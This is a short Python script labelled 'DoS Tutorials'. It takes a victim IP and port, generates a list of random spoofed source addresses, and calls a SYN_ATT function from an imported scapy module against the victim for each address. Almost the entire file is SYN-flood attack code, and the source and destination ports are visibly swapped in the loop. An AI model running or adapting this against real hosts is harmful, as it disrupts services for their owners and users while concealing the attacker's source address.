# Jayesh Patel
# DoS Tutorials

import random
import argparse
from scapy_dos import Dos_Attack
from tool_dos import Dos_Tools

parser = argparse.ArgumentParser(description="Pass Arguments")
parser.add_argument('c_num', type=int, help='Enter Number of request')
parser.add_argument('victim_ip', type=str, help='Enter Victim IP')
parser.add_argument('victim_port', type=str, help='Enter Victim Port')
parser.add_argument('source_ip', type=str, help='Enter Source IP')
parser.add_argument('source_port', type=str, help='Enter Source Port')
args = parser.parse_args()


# Generate IP address
c_num = args.c_num
count = 0
IP1 = []

if args.source_ip != "random":
	IP1.append(args.source_ip)

if args.source_ip == "random":
	while True:
		addr = [192, 168, 0 , 1]
		d = '.'
		addr[0] = str(random.randrange(11,197))
		addr[1] = str(random.randrange(0,255))
		addr[2] = str(random.randrange(0,255))
		addr[3] = str(random.randrange(2,254))
		assemebled = addr[0]+d+addr[1]+d+addr[2]+d+addr[3]
		IP1.append(assemebled)
		count += 1
		if count == c_num:
			break


for ip in IP1:
	sip = ip
	dip = args.victim_ip
	sport = int(args.victim_port)
	dport = int(args.source_port)

	print "source ip : %s , destination ip : %s , source port : %s , destination port : %s" % (ip, dip, sport, dport)
	
	res = Dos_Attack(sip, dip)	
	# we need run run SYN Attack, call function SYN_ATT from scapy_dos.py file with two argument
	# def SYN_ATT(self, sport, dport):	
	res.SYN_ATT(sport, dport)
	

